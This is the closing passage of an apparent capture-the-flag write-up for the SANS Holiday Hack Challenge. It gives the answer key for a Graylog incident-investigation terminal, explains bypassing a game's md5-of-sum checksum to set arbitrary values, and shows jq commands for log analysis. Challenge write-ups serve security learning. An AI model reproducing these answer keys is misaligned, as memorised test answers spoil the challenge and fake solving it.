{ "_id" : "You did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **" }
$ db.loadServerScripts();displaySolution();
{% endhighlight %}

### Terminal: Greylog

Question 1: "C:\Users\minty\Downloads\cookie_recipe.exe"  
Question 2: "192.168.247.175:4444"  
Question 3: "whoami"  
Question 4: "webexservice"  
Question 5: "C:\cookie.exe"  
Question 6: "alabaster"  
Question 7: "06:04:28"  
Question 8: "elfu-res-wks2,elfu-res-wks3,3"  
Question 9: "C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf"  
Question 10: "104.22.3.84"  

### Terminal: Oregon Trail

Playing on hard difficulty, all the state values are protected by a "checksum" which is just `md5(sum(values))`.
This means that as long as we recalculate that value we can set the values to whatever we want.
Another method is to modify the starting values so that their sum is still the same.
I set the money to zero, added 250 reindeers, 200 runners, 50 medicine, and 1000 food and just spammed the go button until I won.

### Terminal: jq

{% highlight bash %}
$ jq -c '.|.duration' conn.log | sort -n | tail
1019365.337758

$ jq -c '.|[.duration, .["id.resp_h"]]' conn.log |grep '1019365'
[1019365.337758,"13.107.21.200"]
{% endhighlight %}

What is the destination IP address with the longes connection duration? 13.107.21.200

## Conclusion

Thanks for this year's SANS Holiday Hack Challenge. As usual it was great fun to play through the challenges and I look forward to the next year.

